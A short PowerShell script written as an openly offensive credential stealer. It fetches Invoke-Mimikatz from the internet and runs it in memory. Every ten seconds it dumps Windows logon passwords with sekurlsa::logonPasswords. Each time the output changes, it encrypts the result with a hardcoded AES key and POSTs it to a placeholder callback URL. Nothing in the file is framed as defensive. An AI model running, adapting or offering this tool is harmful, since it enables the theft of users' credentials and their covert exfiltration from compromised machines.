# script parameters
param (
    [Parameter(Mandatory=$false)][string]$aesKey = '4t7w!z%C*F-JaNdRgUkXp2s5u8x/A?D(',
    [Parameter(Mandatory=$false)][string]$callbackUrl = 'http://0.0.0.0/',
 )

function Get-StringHash([String] $String, $HashName = "SHA512")
{
	$StringBuilder = New-Object System.Text.StringBuilder
	[System.Security.Cryptography.HashAlgorithm]::Create($HashName).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
		[Void]$StringBuilder.Append($_.ToString("x2"))
	}
	$StringBuilder.ToString()
}

function Publish-Update($output)
{
	$outputSecureString = [string]$output | ConvertTo-SecureString -AsPlainText -Force
	$cipherText = $outputSecureString | ConvertFrom-SecureString -key $aesKey.byteArray

	$body = @{
		data = $cipherText
	}
	$result = Invoke-RestMethod -Uri $callbackUrl -Method Post -Body $body
}

# main
$hash = ''
$mimikatzUrl = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'
IEX (New-Object System.Net.Webclient).DownloadString($mimikatzUrl)

while ($true) {
	#Invoke-Mimikatz -Command "token::elevate"
	$output = Invoke-Mimikatz -Command "sekurlsa::logonPasswords"
	$newHash = Get-StringHash $output
	if ($newHash -ne $hash) {
		Publish-Update $output
	}

	$hash = $newHash
	Start-Sleep -Second 10
}
